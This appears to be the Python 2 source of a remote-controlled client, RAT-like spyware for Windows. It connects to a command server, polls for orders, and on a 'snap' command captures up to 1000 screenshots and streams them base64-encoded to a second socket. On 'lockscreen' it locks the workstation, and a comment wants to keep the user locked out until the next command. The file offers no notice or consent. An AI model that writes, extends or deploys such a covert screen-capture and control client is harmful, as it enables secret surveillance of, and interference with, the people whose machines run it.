import socket
import time
import random
import ImageGrab
from PIL import Image
import uuid
import os
import base64
import ctypes
import threading
import datetime

global userid

DEBUG = 1

def log(msg):
	if DEBUG:
		print msg
	return


def lockscreen_handler():
	# TODO think of a way to lock the user until other command
	ctypes.windll.user32.LockWorkStation()
	return


def snap_handler(userid):
	log('started snap handler')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 10000))
	snapid = 0
	image_timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M")
	image_date = image_timestamp.split('T')[0]
	image_hour = image_timestamp.split('T')[1].split(":")[0]
	image_minute = image_timestamp.split('T')[1].split(":")[1]
	print datetime.datetime.now().isoformat()
	for i in xrange(1000):
		log('Getting snap num {0}'.format(i))
		snapshot = ImageGrab.grab() # TODO Lower quality
		save_path = "C:\\Users\\user\\MySnapshot.jpg"
		snapshot.save(save_path)
		log('got snap, snapid: ' + str(snapid))
		# Send
		f = open(save_path, 'rb')

		while True:
			log('Reading from snap')
			raw_data = f.read(500000)
			if not raw_data:
				log('breaking')
				break
			encoded_data = base64.b64encode(raw_data)
			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, len(encoded_data))
			s.send(msg)
			time.sleep(0.1)
			s.send(encoded_data)
			#time.sleep(0.1)
			log('Sent snap')

		# finish, remove the file
		f.close()
		os.remove(save_path)

		# Check for new variables for the next file
		image_new_timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M")
		if image_new_timestamp != image_timestamp:
			image_timestamp = image_new_timestamp
			image_date = image_timestamp.split('T')[0]
			image_hour = image_timestamp.split('T')[1].split(":")[0]
			image_minute = image_timestamp.split('T')[1].split(":")[1]
			snapid = 0
		else:
			snapid += 1

	print datetime.datetime.now().isoformat()



def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 8002))
	log('connected')
	userid = random.randint(1,10001)
	log('userid ' + str(userid))
	s.send(str(userid))
	s.recv(1024)
	log('before while')
	while True:
		s.send("KeepAlive!")
		log('sleeping')
		# TODO maybe dynamic way to consider sleeping time
		time.sleep(5)
		req = s.recv(1024)
		log('Do request: ' + req)
		if req == 'snap':
			threading.Thread(target=snap_handler, args=(userid,)).start()
		if req == 'lockscreen':
			lockscreen_handler()
		elif req == 'nojobs':
			log('no jobs for me!')

if __name__ == '__main__':
	main()